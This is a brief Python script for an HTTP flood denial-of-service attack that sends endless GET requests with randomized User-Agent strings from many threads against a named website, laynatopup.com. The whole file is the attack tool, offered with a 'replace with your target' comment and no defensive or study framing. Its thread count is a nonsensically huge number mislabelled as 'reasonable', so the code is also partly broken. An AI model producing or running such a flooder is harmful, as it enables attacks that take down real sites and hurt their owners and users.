import requests
import threading
import random

def http_flood(target_url):
    while True:
        try:
            # Generate random user-agent for each request
            headers = {"User-Agent": f"User-Agent-{random.randint(1, 10000)}"}
            response = requests.get(target_url, headers=headers)
            print(f"Sent GET request to {target_url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

target_url = "https://www.laynatopup.com/"  # Replace with your target
threads = 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 # Set a reasonable number of threads based on your system's capability

# Start the threads
for i in range(threads):
    thread = threading.Thread(target=http_flood, args=(target_url,))
    thread.start()